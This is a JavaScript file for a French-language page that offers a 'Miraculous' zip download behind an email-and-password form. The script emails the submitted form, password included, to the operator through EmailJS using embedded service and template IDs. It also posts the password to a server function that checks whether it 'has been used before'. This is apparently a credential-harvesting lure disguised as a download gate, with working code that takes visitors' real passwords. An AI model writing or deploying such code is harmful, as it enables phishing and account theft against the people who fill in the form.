// Initialize EmailJS
emailjs.init("P5sZnQL5xeXagOuEn");

document.getElementById('downloadForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Check if password is "12345678"
    if (password === '12345678') {
        alert('Ce mot de passe est interdit. Veuillez en choisir un autre.');
        return;
    }

    try {
        // Send the email with EmailJS
        await emailjs.sendForm('service_2pmpp5p', 'template_0gmgvlw', this);
        
        // Enable the download button
        const downloadLink = document.createElement('a');
        downloadLink.href = 'your-download-file-url.zip'; // URL for the file to download
        downloadLink.download = 'Miraculous_Download.zip'; // The file will be saved with this name
        downloadLink.click();
        
        alert('Téléchargement commencé!');
    } catch (error) {
        console.error('Erreur de l\'envoi:', error);
        alert('Erreur serveur. Veuillez réessayer plus tard.');
    }
});

function checkPassword() {
    const passwordInput = document.getElementById('password');
    const downloadBtn = document.getElementById('downloadBtn');
    
    // Make an API request to check if the password has been used before
    fetch('/.netlify/functions/check-password', {
        method: 'POST',
        body: JSON.stringify({ password: passwordInput.value }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.error) {
            downloadBtn.disabled = true;
            alert(data.error);
        } else {
            downloadBtn.disabled = false;
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Une erreur est survenue.');
    });
}
